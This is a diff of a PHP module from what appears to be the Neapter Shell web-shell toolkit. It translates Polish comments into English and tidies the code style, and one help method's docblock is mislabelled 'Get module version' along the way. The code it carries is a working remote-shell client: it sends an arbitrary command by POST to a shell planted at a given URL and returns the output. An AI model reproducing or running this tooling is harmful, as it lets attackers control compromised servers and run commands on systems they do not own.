@@ -10,7 +10,7 @@
  */
 
 /**
- * Zdalne wywolanie shella
+ * Connect to remote shell and execute command
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
  * @copyright Copyright (c) 2012, Krzysztof Otręba
@@ -21,9 +21,8 @@
 class ModuleRemote extends ModuleAbstract
 {
     /**
-     * Dostepna lista komend
+     * Get list of available commands
      *
-     * @access public
      * @return array
      */
     public static function getCommands()
@@ -32,9 +31,8 @@ class ModuleRemote extends ModuleAbstract
     }
 
     /**
-     * Zwracanie wersji modulu
+     * Get module version
      *
-     * @access public
      * @return string
      */
     public static function getVersion()
@@ -42,13 +40,12 @@ class ModuleRemote extends ModuleAbstract
         /**
          * Wersja Data Autor
          */
-        return '1.00 2012-01-26 - <krzotr@gmail.com>';
+        return '1.0.1 2016-06-27 - <krzotr@gmail.com>';
     }
 
     /**
-     * Zwracanie pomocy modulu
+     * Get module version
      *
-     * @access public
      * @return string
      */
     public static function getHelp()
@@ -65,59 +62,40 @@ DATA;
     }
 
     /**
-     * Wywolanie modulu
+     * Get details module information
      *
-     * @access public
      * @return string
      */
     public function get()
     {
-        /**
-         * Help
-         */
         if ($this->oArgs->getNumberOfParams() < 2) {
             return self::getHelp();
         }
 
-        /**
-         * Rozszerzenie CURL jest wymagane
-         */
         if (!extension_loaded('curl')) {
             return 'Brak rozszerzenie CURL';
         }
 
         $rCurl = curl_init();
 
-        /**
-         * Parametry
-         */
-        curl_setopt_array($rCurl, array
-            (
+        curl_setopt_array(
+            $rCurl,
+            array(
                 CURLOPT_URL => $this->oArgs->getParam(0),
                 CURLOPT_USERAGENT => 'Neapter Shell Agent',
                 CURLOPT_ENCODING => 'gzip, deflate',
-                CURLOPT_POST => TRUE,
+                CURLOPT_POST => true,
                 CURLOPT_POSTFIELDS => array('cmd' => $this->oArgs->getParam(1)),
                 CURLOPT_CONNECTTIMEOUT => 60,
-                CURLOPT_RETURNTRANSFER => TRUE,
+                CURLOPT_RETURNTRANSFER => true,
                 CURLOPT_HTTPHEADER => array('X-Requested-With: XMLHttpRequest')
             )
         );
 
-        /**
-         * Polaczenie ze zdalnym shellem
-         */
         $sData = curl_exec($rCurl);
-
-        /**
-         * Zamkniecie polaczenia
-         */
         curl_close($rCurl);
 
-        /**
-         * Blad podczas polaczenia z shellem
-         */
-        if ($sData === FALSE) {
+        if ($sData === false) {
             return 'Nie można połączyć się ze zdalnym shellem';
         }
 
